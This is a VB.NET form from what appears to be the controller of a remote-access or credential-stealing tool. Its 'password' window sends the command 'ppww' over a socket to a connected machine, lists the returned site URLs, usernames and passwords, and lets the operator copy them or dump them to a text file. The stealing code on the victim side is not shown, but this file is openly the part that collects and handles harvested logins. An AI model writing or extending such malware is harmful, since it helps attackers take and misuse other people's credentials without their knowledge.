Imports System.ComponentModel
Imports Microsoft.VisualBasic.CompilerServices
Imports System.Net
Imports System
Imports System.IO
Imports System.Windows.Forms
Imports System.Diagnostics
Imports Microsoft.VisualBasic
Imports System.Windows.Forms.TextBox
Imports System.Windows.Forms.MessageBox 'para manter todas as messagebox em superior ou forme na hora de ser exebidas
Imports System.Windows.Forms.ListView
Imports System.Windows.Forms.ContextMenuStrip

'coded pjoao1578
'v3
Public Class password
#Region "password"
    Public sock As Integer
#End Region

    Private Sub password_FormClosed(sender As Object, e As FormClosedEventArgs) Handles Me.FormClosed
        Try

        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            Me.Close()
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub password_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Try

        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            Me.Close()
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub password_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Try

        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub SalvarEmTxtToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SalvarEmTxtToolStripMenuItem.Click
        'salvar pass em text
        Dim o As New SaveFileDialog
        o.Filter = "Text Pass|*.TXT"
        If o.ShowDialog = Windows.Forms.DialogResult.OK Then
            For Each ll As ListViewItem In ListView1.Items
                My.Computer.FileSystem.WriteAllText(o.FileName, "URL : " & ll.SubItems(0).Text & " User : " & ll.SubItems(1).Text & "Pass  : " & ll.SubItems(2).Text, True)
            Next
            MessageBox.Show("Salvo Em TXT", "Salvo", MessageBoxButtons.OK, MessageBoxIcon.Asterisk) 'mensagem
        End If
    End Sub

    Private Sub CopyPassToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyPassToolStripMenuItem.Click
        'copy pass
        Try
            My.Computer.Clipboard.SetText(ListView1.FocusedItem.SubItems(2).Text.ToString)
        Catch ex As Exception
        End Try
        MessageBox.Show("Pass Copiado", "Copiado !", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
    End Sub

    Private Sub CopyUserToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyUserToolStripMenuItem.Click
        'copy user
        Try
            My.Computer.Clipboard.SetText(ListView1.FocusedItem.SubItems(1).Text.ToString)
        Catch ex As Exception
        End Try
        MessageBox.Show("User Copiado", "Copiado !", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
    End Sub

    Private Sub OpenURLToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles OpenURLToolStripMenuItem.Click
        'copy URL
        Try
            My.Computer.Clipboard.SetText(ListView1.FocusedItem.SubItems(0).Text.ToString)
        Catch ex As Exception
        End Try
        MessageBox.Show("URL Copiado", "Copiado !", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
    End Sub

    Private Sub password_Closed(sender As Object, e As EventArgs) Handles Me.Closed
        Try
            Me.ListView1.Items.Clear() 'limpa lista
        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub password_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        Try
            Me.ListView1.Items.Clear() 'limpa lista
        Catch ex As Exception
            ProjectData.SetProjectError(ex)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub Updeterpass_Click(sender As Object, e As EventArgs) Handles Updeterpass.Click
        'updeter pass
        Try
            Form1.s.Send(sock, "ppww")
        Catch ex As Exception 'clean erros
        End Try
    End Sub
End Class